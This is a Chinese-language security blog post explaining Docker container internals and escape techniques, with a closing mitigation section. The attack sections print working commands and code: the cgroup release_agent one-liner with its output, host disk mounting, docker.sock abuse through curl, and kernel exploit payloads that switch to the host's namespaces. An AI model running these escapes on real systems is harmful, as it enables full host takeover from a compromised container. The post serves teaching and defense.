<!DOCTYPE html><html><html style="background-color:#4c433f"><head><script src="/@webcomponents/webcomponentsjs/webcomponents-loader.js"></script><script async="" src="https://www.googletagmanager.com/gtag/js?id=G-8DTJPD8FFX"></script><script>
                    window.dataLayer = window.dataLayer || [];
                    function gtag(){dataLayer.push(arguments);}
                    gtag('js', new Date());
                    gtag('config', 'G-8DTJPD8FFX', {
                      page_path: window.location.pathname,
                    });
                  </script><meta charSet="utf-8"/><link rel="shortcut icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><link rel="icon" href="/favicon.ico" type="image/vnd.microsoft.icon"/><style>
            body {
              font-family: Noto Sans TC, &#x27;Lato&#x27;, sans-serif;
            }
          </style><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="facebook-domain-verification" content="ud6xuazjca17uowsk65p2jrevtvosd"/><title>Container Escape 101</title><meta property="og:title" content="Container Escape 101"/><meta name="description" content="圖片來源：[Pixabay](https://pixabay.com/photos/emergency-exit-exit-sign-escape-1321134/)

## 前言

本月來到 D39 與大家分享近期有趣的研究，Lab 團隊雖然不像是科幻電影中的實驗室般，穿著帥氣的白袍與擁有高科技的實驗室，但我們主要專注於最新技術與威脅研究，與惡意程式作者們互相切磋是我們的日常。而 Lab 中的 D39 成員更致力於弱點安全與漏洞挖掘領域，研究範圍包含 Mobile、IOT、Linux、Windows 等有機會連網的系統與裝置都是我們的目標，期許能提升客戶產品安全性，打造優良的上網環境（笑）

這一次由 D39 實習生 Jack，為我們精心整理 Container 相關的弱點攻擊方式，透過清楚易懂的介紹，帶大家了解究竟在駭客眼中的 Container，存在哪些資安問題呢？

## 正文開始

相信大家對 Docker 都不陌生，無論是想要架設網站、資料庫或郵件伺服器，只要一行 `docker run` 就能搞定，不用處理可怕的環境問題，但若它存在漏洞或一些錯誤的設定，跑在 Container 內的 Process 就有可能控制主機。

這次與大家介紹 Container Escape 的一些攻擊方法，讓各位在使用 Container 時可以留意相關的安全隱憂，以及了解這些漏洞造成的影響。

## Container

在介紹攻擊方法之前，先來了解一下 Container 使用到的技術：

* Namespaces
* Cgroups
* Seccomp
* Capabilities
* LSM
* OverlayFS

### Namespaces

Container 好用的地方在於，它能夠建立一個獨立的環境，可以放心地安裝一大堆想嘗試的套件，不怕弄髒自己的環境。要實現這個功能，Namespaces 扮演了一個很重要的角色。

來看看 Linux Programmer&#x27;s Manual [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html) 的描述：

&gt;A namespace wraps a global system resource in an abstraction that makes it appear to the processes within the namespace that they have their own isolated instance of the global resource.  Changes to the global resource are visible to other processes that are members of the namespace, but are invisible to other processes.  One use of namespaces is to implement containers.

這邊的「資源」（resource）指的就像 Mount point 或 PID，Namespaces 可以建立一個獨立的 Mount point 或 PID，讓 Container 僅能存取自己掛載的檔案系統或自己的 Process，與 Host 隔離開來，不會弄亂 Host 的檔案，或存取到 Host 的 Process 資訊。

使用 Namespaces 的方式就是呼叫 `unshare`、`setns`、`clone` 等 System call，類別也不只有 Mount 與 PID，詳細可以看 [Man page](https://man7.org/linux/man-pages/man7/namespaces.7.html)。

### Cgroups

Cgroups 透過 `cgroupfs` 控制 Process 所能使用的記憶體容量或 CPU 資源，讓 Process 不會因為一些 bug 讓整台電腦當機，Docker 可以用 `--cpu-shares` 來限制各個 Container 能用到的 CPU 資源。詳細請見 [Cgroups man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)。

### Seccomp
Seccomp (Secure Computing) 對 CTFer 可能不陌生，用來限制能夠使用的 System call，常見於一些 Shellcode 題。

Container 很常禁用 `mount` ，因為它是一個方便我們逃離 Container 的 System call，接下來就會說明如何利用 `mount` 逃出 Container。詳細請見 [Seccomp man page](https://man7.org/linux/man-pages/man2/seccomp.2.html)。

### Capabilities

Capabilities 從 Linux Kernel 2.2 開始加入，目的是將權限做更細緻的區隔，以 Container 來說，若直接給它 `root` 權限是不安全的，這意味著它可以隨意載入 Kernel module 或 `mount`，讓 Container 有機會存取 Host 資源，因此 Container 內的 `root` 只有一些基本的 Capabilities，如 CAP\_CHOWN、CAP\_KILL、CAP\_SETUID、CAP\_SETGID 等。Ubuntu 使用者可以安裝 `libcap2-bin` 並使用 `getpcaps {pid}` 查看該 Process 擁有哪些 Capabilities，詳細請看 [man page](https://man7.org/linux/man-pages/man7/capabilities.7.html)。

### LSM (Linux Security Module)

Linux kernel 文件裡寫道：

&gt; The primary users of the LSM interface are Mandatory Access Control (MAC) extensions which provide a comprehensive security policy.

如 AppArmor 和 SELinux 都是 Linux Kernel 內建的 Security Module，透過它們專屬的設定檔可以限制 Process 的存取權限，像 Docker 就是使用 AppArmor 限制 `procfs` 以及 `mount`，保護 Host 資源。

### OverlayFS

許多 Container 使用 OverlayFS 當作它的檔案系統，如它的名字，目的就是要把兩個或多個檔案系統合併，讓它看起來是一個檔案系統。它使用了 `upper` 與 `lower` 區分兩種要合併的檔案系統，其中若 `upper` 與 `lower` 有相同檔案時，會以 `upper` 為主。我們用 Container 來解釋，Docker 把 `upper` 當作 Container layer、`lower` 當作 Image layer，我們在 `docker build` 的時候會產生 Image，利用這些 Image 我們可以很快地產出 Container，在 Image 內的檔案如 Ubuntu 預設的系統檔案就會被放在 Image layer，在 Container runtime 產生的檔案，例如 Log 檔會被放在 Container layer，這麼一來建立多個 Container 時可以讓它們的 Image layer 都是同一個，省下許多空間。

來實驗一下，首先開兩個 Container：

```
$ docker run --name t1 -it ubuntu
root@e937832abc06:/#
```

```
$ docker run --name t2 -it ubuntu
root@71c8a58e90ac:/#
```

檢查它們的 LowerDir：

```
$ docker inspect t1 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,
$ docker inspect t2 | grep Lower
                &quot;LowerDir&quot;: ...:/var/lib/docker/overlay2/07a2cbd7...dbdf/diff:...,
```

仔細一看，列出來的路徑幾乎是一樣的，接下來看看裡面有什麼：

```
$ sudo ls -alF /var/lib/docker/overlay2/07a2cbd7...dbdf/diff
total 24
drwxr-xr-x 6 root root 4096 Nov 13  2019 ./
drwx------ 4 root root 4096 Nov 13  2019 ../
drwxr-xr-x 4 root root 4096 Nov  1  2019 etc/
drwxr-xr-x 2 root root 4096 Nov  1  2019 sbin/
drwxr-xr-x 3 root root 4096 Oct 30  2019 usr/
drwxr-xr-x 3 root root 4096 Oct 30  2019 var/
```

是很常見的系統資料夾！也就是 Image layer，接下來看 Container layer：

```
root@e937832abc06:/# echo &#x27;hello, host&#x27; &gt; /hello
```

先在 Container 內創立一個檔案：

```
$ docker inspect e937 | grep Upper
                &quot;UpperDir&quot;: &quot;/var/lib/docker/overlay2/657597a...a966/diff&quot;,
$ sudo cat /var/lib/docker/overlay2/657597a...a966/diff/hello
hello, host
```

然後用 `docker inspect` 找到 UpperDir，就會看到我們建立的 `hello` 檔案了！

&lt;br/&gt;

## Container Escape
來試想一個情境，有一台主機遵守 Microservices 的精神，使用 Docker 分別架設了網站、資料庫與郵件伺服器這三個 Container，假設郵件伺服器存在漏洞被駭客入侵，也不會直接影響到網站和資料庫，維護的工程師也能很快的用 Docker 換成新版本來進行即時修補。但如果 Container 存在漏洞時，所有的服務都有可能陷入風險。

### Privileged Container
我們先從比較容易 Escape 的 Privileged Container 開始，Privileged Container 沒有 Seccomp 限制且 Capability 全開，讓 Container 可以存取所有硬體設備，為的就是讓這個 Container 有獨立的環境且能做 Host 能做的事。Docker 建立 Privileged container 的方法很簡單，只要在 `dokcer run` 時多加個 `--privileged` flag 即可。

`docker run --privileged -it ubuntu`

另外還有一個很棒的功能，用 Docker 跑 Docker。聽起來很奇怪但很合理，如果去看 Docker 的[開發文件](https://github.com/docker/docker-ce/blob/master/components/engine/docs/contributing/set-up-dev-env.md)，會發現 Docker 是用 Docker 開發的。

一般來說開發用的 Privileged container 駭客碰不到，但如果是用 Docker 架設 CI/CD 工具，然後使用這些工具的 Docker 功能呢？歡迎參考[這篇](https://www.slideshare.net/Docker/build-publish-deploy-and-test-docker-images-and-containers-with-jenkins-workflow)的 &quot;How Can You Use Jenkins &amp; Docker Together&quot;。

沒錯，你需要一個 Privileged container 來運行 CI/CD 工具！接下來先以 Privileged container 為例，說明在我們打下有漏洞的 CI/CD 工具且有 `root` 權限後，要怎麼控制 Host。

#### Mount root
第一個要介紹的是這個一直被針對的 `mount` ，在 Privileged container 裡是可以直接使用的，來看看如何透過它存取 Host 檔案。

首先先取得 Block device 的 Major 與 Minor：

```
root@997453a4062f:/test# ls -alF /sys/dev/block/ | grep sda1
lrwxrwxrwx 1 root root 0 Aug 12 06:50 8:1 -&gt; ../../devices/pci0000:00/0000:00:01.1/ata1/host0/target0:0:0/0:0:0:0/block/sda/sda1/
```

`sda1` 是 Host 的根目錄（不同的電腦可能不一樣，對駭客來說可以全部都試試看）。接下來用 `mknod` 產 Block special file 然後 `mount`，就會把 Host 的根目錄放在 Container 內了（若 `/dev/sda1` 不存在才需要使用 `mknod`）。

Docker:

```
root@997453a4062f:/test# mknod /dev/myroot b 8 1
root@997453a4062f:/test# mkdir rootfs; mount /dev/myroot rootfs
root@997453a4062f:/test# echo hello, host! &gt; rootfs/hello
```

Host:

```
root@escape:/# cat /hello
hello, host!
```

#### Cgroups v1 release notification

只能存取 `root` 資料夾還不夠！我們的目標是能在 Host 上做任何事且不受 Container 影響。接下來要介紹的是 [Felix Wilhelm 在 Twitter 上寫的](https://twitter.com/_fel1x/status/1151487051986087936)：

&gt; Quick and dirty way to get out of a privileged k8s pod or docker container by using cgroups release_agent feature.

```
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
```

直接用 Docker 跑跑看：

```
$ docker run --privileged -it ubuntu
root@acf8f56c9de6:/test# cat &gt; exp.sh
d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
root@acf8f56c9de6:/test# chmod +x ./exp.sh
root@acf8f56c9de6:/test# ./exp.sh ps
  PID TTY          TIME CMD
    1 ?        00:01:31 systemd
    2 ?        00:00:00 kthreadd
    3 ?        00:00:00 rcu_gp
    4 ?        00:00:00 rcu_par_gp
    6 ?        00:00:00 kworker/0:0H-kb
    9 ?        00:00:00 mm_percpu_wq
   10 ?        00:00:15 ksoftirqd/0
   11 ?        00:09:23 rcu_sched
   12 ?        00:00:02 migration/0
   13 ?        00:00:00 idle_inject/0
   14 ?        00:00:00 cpuhp/0
   15 ?        00:00:00 cpuhp/1
   16 ?        00:00:00 idle_inject/1
   17 ?        00:00:03 migration/1
   18 ?        00:00:05 ksoftirqd/1
   20 ?        00:00:00 kworker/1:0H-ev
   ...
root@acf8f56c9de6:/test# ./exp.sh id
uid=0(root) gid=0(root) groups=0(root)
```

太棒了！可以在 Container 外執行任意指令且是 `root` 權限。接下來分析它怎麼做到的：

```
root@acf8f56c9de6:/test# d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
root@acf8f56c9de6:/test# echo $d
/sys/fs/cgroup/rdma
```

`d` 變數的目的是取得 Cgroups 底下有 `release_agent` 檔案的路徑，`release_agent` 的描述可參考 [Man page](https://man7.org/linux/man-pages/man7/cgroups.7.html)：

&gt; A special file in the root directory of each cgroup hierarchy, release_agent, can be used to register the pathname of a program that may be invoked when a cgroup in the hierarchy becomes empty.

變為空的意思：

&gt; A cgroup is considered to be empty when it contains no child cgroups and no member processes.

`release_agent` 一般用來讓使用者自訂腳本，清理新建的 Cgroups 讓 `cgroupfs` 保持乾淨，而它會在 Host 以 `root` 權限執行，所以只要能控制 `release_agent`，我們就可以在 Container 外執行任意指令。

在 Cgroups 資料夾底下創立一個 `w` 資料夾，會讓 Cgroups 創立一個新的群組，然後啟用這個群組的 `notify_on_release`：

```
mkdir -p $d/w;echo 1 &gt;$d/w/notify_on_release
```

`t` 變數是找出 Host 可以直接看到 Container 檔案的路徑，也就是 OverlayFS 的 UpperDir (Container layer) ，以便 `release_agent` 能夠呼叫 Container 內的惡意腳本：

```
t=`sed -n &#x27;s/.*\perdir=\([^,]*\).*/\1/p&#x27; /etc/mtab`
```

最後一步把 `release_agent` 指到我們能控制的惡意腳本，然後利用 `echo 0 &gt; $d/w/cgroup.procs` 把 `echo` 加入 `w` 這個 Cgroups，待 `echo` 結束後就會觸發 `notify_on_release` 然後呼叫 `release_agent`：

```
touch /o; echo $t/c &gt;$d/release_agent;echo &quot;#!/bin/sh
$1 &gt;$t/o&quot; &gt;/c;chmod +x /c;sh -c &quot;echo 0 &gt;$d/w/cgroup.procs&quot;;sleep 1;cat /o
```

可以發現我們主要用到的功能是 Cgroups 以及 `mount`，因此這個利用方式有個修訂版本，只要使用 `docker run -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu bash` 就可以利用較少的權限 Escape，詳細可以看[這篇文章](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)。

&lt;iframe src=&quot;https://asciinema.org/a/356357/embed?&quot; id=&quot;asciicast-iframe-356357&quot; name=&quot;asciicast-iframe-356357&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

#### Exposed docker.sock

用 Docker 跑 Docker 的方式還有這個：

```
docker run -v /var/run/docker.sock:/var/run/docker.sock
```

`dockerd` 開啟後預設會在 `/var/run/docker.sock` 聽取命令，等待使用者送出 Docker 指令後，`docker-cli` 會把指令轉成一定的格式跟 `docker.sock` 溝通，所以把這個檔案映射到 Container 內，等同於讓這個 Container 能夠用 Host 的名義建立 Container。

我們可以簡單的使用 `curl` 控制 `docker.sock`：

```
$ curl -XPOST --unix-socket /var/run/docker.sock -d &#x27;{&quot;Image&quot;:&quot;ubuntu&quot;, &quot;Privileged&quot;:true}&#x27; -H &#x27;Content-Type: application/json&#x27; http://localhost/containers/create
{&quot;Id&quot;:&quot;8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a&quot;,&quot;Warnings&quot;:[]}
$ curl -XPOST --unix-socket /var/run/docker.sock http://localhost/containers/8e89909670942daa92999f337fb325b4a89f6a2dd2f5fcf9e972ca089c5b751a/start
```

只要對 `docker.sock` 發送請求就能創立一個 Container！可以用上面的方法開啟一個 Privileged container，再利用前面的手法拿到 Host 控制權！

&lt;br/&gt;

### Container Engine bug

不過一般的服務如郵件伺服器，它不需要用 Docker 跑 Docker 的功能，也就不會以 `--privileged` 的方式運行，所以就算利用漏洞拿到 Container 的 `root` 權限，也不能用 `mount` 或 `docker.sock` 的方式 Escape，但如果 Container Engine 本身有漏洞，就有機會利用它控制 Host。

#### runC CVE-2019-5736

第一個要介紹的是 runC (run container)，它是一個根據 OCI 規範用來運行 Container 的程式，被許多 Container engine 呼叫，例如：Docker、Kubernets、LXC 等，因此這個漏洞影響範圍相當大（[詳細受影響清單](https://www.cvedetails.com/cve/CVE-2019-5736/)）。而攻擊條件是駭客在 Container 內有 `root` 權限，或 Container Engine 執行了惡意的 Container。

它的漏洞原因在於，新的 Process 若是 `/proc/self/exe`，就能利用殘留的 File descriptor 改寫 runC 這隻程式，等到下次有人使用 Docker 時就會執行被改寫的 runC，而 Docker 是用 `root` 權限運行的，因此就獲得了 `root` 的任意命令執行！

先來看 Process 在正常狀況下是如何被放進 Container。在執行 `docker exec` 的時候 runC 會把自己放進 Container 的 Namespace 然後再 `execve(&quot;binary&quot;)`：

![Blog_9-6](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-6_2c8cdf52db.png)

但 Process 若指定成 `/proc/self/exe` 就會指回 runC 本身：

![Blog_9-7](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544713/Blog_9-7_011278ad04.png)

有趣的事情發生了！runC 執行 `execve(&quot;/proc/self/exe&quot;)`，也就是再跑了一次 runC，但用的 Library 是 Container 內的 Library，所以我們可以改寫 Container 內的 `libc` 或 `libseccomp` 之類的 runC 會用到的 Dynamic library，執行任意的程式碼！

![Blog_9-8](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-8_2620f0f070.png)

有任意程式碼執行後重複開啟 `/proc/self/exe`，就能存取 Host 的 runC 程式，但在 Linux 裡執行中的程式是不能被修改的，所以先用 `open` 的 `O_PATH` 模式留下 File descriptor，但不開啟檔案然後 `fork` 讓子程序對 runC 寫入惡意指令，接下來只要等待下一次的 `docker exec` 就會觸發惡意指令！

![Blog_9-9](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-9_fb31bbc0f3.png)

這個漏洞是 CTF 隊伍 Dragon Sector 打完比賽後獲得靈感而研究出來的漏洞，詳細的挖掘過程在他們的[部落格](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)，以及他們的 [Exploit Code](https://www.openwall.com/lists/oss-security/2019/02/13/3)。

&lt;iframe src=&quot;https://asciinema.org/a/356360/embed?&quot; id=&quot;asciicast-iframe-356360&quot; name=&quot;asciicast-iframe-356360&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

&lt;br/&gt;

#### rkt CVE-2019-10144/CVE-2019-10145/CVE-2019-10147

rkt 也是一個 Container engine，但已經沒有在維護了，所以這三個 CVE 到現在還是可以利用，不過利用條件較為嚴苛，駭客需要控制由 `rkt enter` 開啟的 Process 才能 Escape（一般狀況下會以 `rkt run` 的方式開啟）。

`rkt enter` 就像是 `docker exec`，可以在指定的 Container 內執行程式，但使用 `rkt enter` 執行的程式擁有所有的 Capabilities ，沒有 Seccomp 限制也沒有隔離 Cgroups。就像個 Privileged Container！

所以使用 `getpcaps $$` 看到所有 Capabilities 的話，恭喜你，你處在一個可以 Container Escape 的環境內！

來看看利用方法，首先下載最新版的 rkt：

```
wget https://github.com/rkt/rkt/releases/download/v1.30.0/rkt-v1.30.0.tar.gz
tar xzvf rkt-v1.30.0.tar.gz
cd rkt-v1.30.0
./rkt help
```

用 `getpcaps` 檢查看看：

```
$ sudo ./rkt --insecure-options=image --interactive=true  run docker://libpcap/libpcap
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
Capabilities for `6&#x27;: = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
```

```
$ sudo ./rkt enter 9354 /bin/bash
root@rkt-9354bcca-e188-453f-942c-6c1ae056ef70:/# getpcaps $$
Capabilities for `14&#x27;: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_rｆaw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37+ep
```

使用 `rkt enter` 開啟的 `bash` 有 `cap_sys_admin`，可以試著用之前說到的 `mount` 方法存取 Host 的檔案！

但這裡會遇到一些問題，`mknod` 出來的 Block special file 放的位置會影響能不能 `mount`，所以這邊用一個改良的做法：

```
# mkdir mydev
# mkdir rootfs
# mount -t devtmpfs none mydev
# mount mydev/sda1 rootfs
```

直接 `mount` 一個型態為 devtmpfs 的資料夾， Linux kernel 就會自動把所有的 Device file 準備好，我們只要 `mount mydev/sda1` 就能存取 Host 的根目錄！

&lt;br/&gt;

### Linux kernel exploit

前面講到的 Privileged container 以及 Container Engine bug 需要在 Container 內有 `root` 權限，但並不是每個服務都是以 `root` 權限運行，例如 HTTP server 通常會以較低權限的使用者如 `www-data` 身份執行，聰明的你一定注意到了，利用 Linux kernel exploit 獲得 `root` 權限然後再 Escape！

其實，有 Linux kernel exploit 的話可以直接 Escape！Container 用到的 Namespaces、Cgroups 等都是由 Linux kernel 提供的功能，所以如果在 Kernel space 內改寫相關結構，再跳回 User space，就能控制 Host，而且也不需要 Container 的漏洞！

讓我們看看 Linux kernel 內管理 Process 的結構 [`task_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/sched.h#L818)

```clike=
struct task_struct {
	/* ... */
	/*
	 * Pointers to the (original) parent process, youngest child, younger sibling,
	 * older sibling, respectively.  (p-&gt;father can be replaced with
	 * p-&gt;real_parent-&gt;pid)
	 */
	
	/* Real parent process: */
	struct task_struct __rcu	*real_parent;
	
	/* Recipient of SIGCHLD, wait4() reports: */
	struct task_struct __rcu	*parent;
	/* ... */
	/* Filesystem information: */
	struct fs_struct		*fs;
	/* ... */
}
```

裡面有一個 [`fs_struct`](https://elixir.bootlin.com/linux/latest/source/include/linux/fs_struct.h#L9)，再往裡面看看：

```clike=
struct fs_struct {
	int users;
	spinlock_t lock;
	seqcount_t seq;
	int umask;
	int in_exec;
	struct path root, pwd;
} __randomize_layout;
```

`task_struct-&gt;fs` 存放著這個 Process 的 `root` 以及工作目錄，而我們能夠用 `task_struct-&gt;real_parent` 取得 Parent process 的 `task_struct`，所以我們可以不斷的往上找，直到找到 `PID = 1`，也就是位於 Host 的 Init process，然後把它的 `fs_struct` 複製給自己，就可以存取 Host 的根目錄了！

![Blog_9-12](https://res.cloudinary.com/dvgomg5gh/image/upload/v1599544712/Blog_9-12_97ea7b5407.png)

這個 Exploit 取自 Nick Freeman 的文章  [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)，他修改了由 Andrey Konovalov 寫的 Linux Kernel exploit，讓它可以 Escape container：

```clike=
typedef unsigned long __attribute__((regparm(3))) (*_copy_fs_struct)(unsigned long init_task);

uint64_t get_task(void) {
    uint64_t task;
    asm volatile (&quot;movq %%gs: 0xD380, %0&quot;:&quot;=r&quot;(task));
    return task;
}

void get_root(void) {

    int i;
    char *task;
    char *init;
    uint32_t pid = 0;


	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));


    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
}
```

每個 Linux kernel exploit 都會有一行：

```
	((_commit_creds)(COMMIT_CREDS))(
	    ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0));
```

用途是建立擁有所有權限的 Credentials 並使用它，也就是讓這個 Process 變成 `root` 權限。而這個 Exploit 就是在它之後加上：

```clike
    task = (char *)get_task();
    init = task;
    while (pid != 1) {
        init = *(char **)(init + TASK_REAL_PARENT_OFFSET);
        pid = *(uint32_t *)(init + TASK_PID_OFFSET);
    }

  
    *(uint64_t *)(task + TASK_FS_OFFSET) = ((_copy_fs_struct)(COPY_FS_STRUCT))(*(long unsigned int *)(init + TASK_FS_OFFSET));
```

用 `while` 迴圈找到 Init process，然後呼叫 `copy_fs_struct` 把 `fs_struct` 複製回來，就能看到 Host 的根目錄。

&lt;iframe src=&quot;https://asciinema.org/a/356361/embed?&quot; id=&quot;asciicast-iframe-356361&quot; name=&quot;asciicast-iframe-356361&quot; scrolling=&quot;no&quot; allowfullscreen=&quot;true&quot; style=&quot;overflow: hidden; margin: 0px; border: 0px; display: inline-block; width: 100%; float: none; visibility: visible; height: 468px;&quot;&gt;&lt;/iframe&gt;

但還沒結束！我們實際上還沒繞過 Namespaces 的限制，如果使用 `kill` 是會失敗的：

```
ubuntu@ubuntu:/$ ./poc
[^] starting
[=] running KASLR defeat exploit (CVE-2017-18344)
[0] enumerating divide_error() location (CVE-2017-18344)
[&gt;] setting up proc reader
...
[+] done, should be root now
[6] checking if we got root
[+] got r00t ^_^
root@ubuntu:/# ps aux | grep cat
user     22522  0.0  0.0   7444   680 pts/1    S+   17:34   0:00 cat
root     22547  0.0  0.0  11288   924 pts/3    S+   17:35   0:00 grep --color=auto cat
root@ubuntu:/# kill 22522
bash: kill: (22522) - No such process
```

但也足夠了，可以用 Docker 執行 Privileged container 再 Escape。或是 Nick Freeman 提供的作法：

&gt; * Write or overwrite host or other container files (including kubelet configs)
&gt; * Interact with Docker (perhaps pull and launch a new fun privileged container)
&gt; * Inject code or harvest data from processes (host or container) via /proc/pid/mem
&gt; * Load/ unload kernel modules

&lt;br/&gt;

這麼一來就可以不用花費力氣在換 Namespaces 上，但也有一篇文章提到更換 Namespaces 的方法 [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)：

```clike=
void get_root_payload( void) {

        ((_commit_creds)(COMMIT_CREDS))(
                ((_prepare_kernel_cred)(PREPARE_KERNEL_CRED))(0)
        );

        // -------- NAMESPACE DOCKER EXPLOIT  --------
        // copy nsproxy from init_nsproxy to pid 1 of the container
        unsigned long long g = ((_find_task_vpid)(FIND_TASK))(1);

        // now, do the magic.... !!!! Simple black magic doesn&#x27;t work on current process!!!!
        ((_switch_task_namespaces)(SWITCH_TASK_NS))(( void *)g, (void *)INIT_NSPROXY);

        // prepare the two namespace FDs by opening the respective files
        long fd = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/mnt&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);

        fd      = ((_do_sys_open)(DO_SYS_OPEN))( AT_FDCWD, &quot;/proc/1/ns/pid&quot;, O_RDONLY, 0);
        ((_sys_setns)(SYS_SETNS))( fd, 0);
}
```

這篇的作法是開啟 `/proc/1/ns/` 資料夾下的檔案，也就是 Namesapces 提供的各個部件（這邊選擇 `mnt` 與 `pid`），然後呼叫 `setns` 把自己的 Namespaces 設定成跟 Host 一樣，這樣就不用額外的步驟，可以直接存取 Host！

&lt;br/&gt;

## Mitigation

上述說到的 Privileged container 是最容易 Escape 的 Container ，若一定得使用它開服務的話，要把它當作 Host 的服務看待，做好權限管理，只要駭客沒有足夠的權限（ `root` ），就不能使用 `mount` 的方式存取 Host 資源，大幅降低它所造成的危害。Docker 可以用 `docker run -u {uid}:{gid}`，以較低的使用者權限開啟 Container，然後把要開啟的服務放在一般使用者可用的 `port &gt;= 1024` 上，這麼一來就算駭客打下服務，也沒有足夠的權限使用 `mount` 做進一步的攻擊：

```
# docker run --privileged -it -u 1000 python bash
I have no name!@6b6f0f0bc93d:/$ python -m http.server 8080 &amp;
[1] 7
I have no name!@6b6f0f0bc93d:/$ Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...

I have no name!@6b6f0f0bc93d:/$ ps aux
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
1000         1  0.1  0.0   5748  3632 pts/0    Ss   02:51   0:00 bash
1000         7  4.0  0.1  25996 18840 pts/0    S    02:51   0:00 python -m http.server 8080
1000         8  0.0  0.0   9388  3100 pts/0    R+   02:51   0:00 ps aux
I have no name!@6b6f0f0bc93d:/$ mkdir /tmp/t1; mkdir /tmp/t2; mount --bind /tmp/t1 /tmp/t2
mount: only root can use &quot;--bind&quot; option
```

也可以善用 `setuid`，切換到權限較低的使用者。剩下的就是定期更新、檢查使用的產品是否出現漏洞，以及避免使用不再維護的產品。

&lt;br/&gt;

## Container security is Linux security

Container 仰賴 Linux kernel 提供的機制，隔離出一塊空間供 Container 使用，所以當這些機制出現問題或開發者設計時沒有考慮周全，原以為安全的 Container 就有可能被駭客利用，造成更大的危害。今天分別介紹 Privileged Container、Container Engine bug 以及 Linux kernel exploit 這三種攻擊情境，都是利用 Linux 本身的特性達到存取 Host 資源的效果。希望你們會喜歡，也祝各位都能成功 Escape！

&lt;br/&gt;

## References

* [Breaking Out of rkt – 3 New Unpatched CVEs](https://unit42.paloaltonetworks.com/breaking-out-of-coresos-rkt-3-new-cves/)
* [The Route to Root: Container Escape Using Kernel Exploitation](https://www.cyberark.com/resources/threat-research-blog/the-route-to-root-container-escape-using-kernel-exploitation)
* [An Exercise in Practical Container Escapology](https://capsule8.com/blog/practical-container-escape-exercise/)
* [CVE-2019-5736: Escape from Docker and Kubernetes containers to root on host](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
* [A Compendium of Container Escapes](https://i.blackhat.com/USA-19/Thursday/us-19-Edwards-Compendium-Of-Container-Escapes-up.pdf)
* [Linux Container Escapes and Hardening](https://gist.github.com/FrankSpierings/5c79523ba693aaa38bc963083f48456c)
* [Understanding Docker container escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

